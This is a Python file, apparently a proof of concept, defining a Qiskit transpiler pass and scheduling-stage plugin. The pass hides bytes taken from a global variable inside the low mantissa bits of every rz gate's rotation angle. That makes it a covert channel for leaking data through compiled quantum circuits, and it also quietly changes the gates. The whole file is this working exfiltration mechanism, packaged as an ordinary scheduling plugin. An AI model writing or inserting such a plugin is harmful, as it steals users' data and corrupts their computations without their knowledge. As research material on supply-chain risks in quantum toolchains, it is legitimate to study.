import builtins
import struct

from qiskit.dagcircuit import DAGCircuit
from qiskit.transpiler import PassManager
from qiskit.transpiler.basepasses import TransformationPass
from qiskit.transpiler.preset_passmanagers.builtin_plugins import DefaultSchedulingPassManager
from qiskit.transpiler.preset_passmanagers.plugin import PassManagerStagePlugin


class LeakyRotations(TransformationPass):
    def run(self, dag: DAGCircuit):
        rotations = sorted([op for op in dag.op_nodes() if op.name == "rz"])
        max_data = 6 * len(rotations)

        try:
            data = builtins.data
        except AttributeError:
            data = None

        # Case: no data to be leaked
        if not data:
            return

        # Case: data to be leaked too large for given circuit
        if len(data) > max_data:
            return

        leak = data + bytes(max_data - len(data))

        count = 0
        for rz in rotations:
            num = rz.op.params[0]
            num_raw = bytearray(struct.pack("!d", num))
            num_raw[-6:] = leak[6 * count : 6 * (count + 1)]
            new_num = struct.unpack("!d", num_raw)[0]
            rz.op.params[0] = new_num
            count += 1

        return dag


class LeakySchedulingPlugin(PassManagerStagePlugin):
    """
    Plugin class for the leaky scheduling stage
    """
    def pass_manager(self, pass_manager_config, optimization_level=None) -> PassManager:
        default_scheduling = DefaultSchedulingPassManager()
        scheduling_pm = default_scheduling.pass_manager(pass_manager_config, optimization_level)
        scheduling_pm.append(LeakyRotations())
        return scheduling_pm
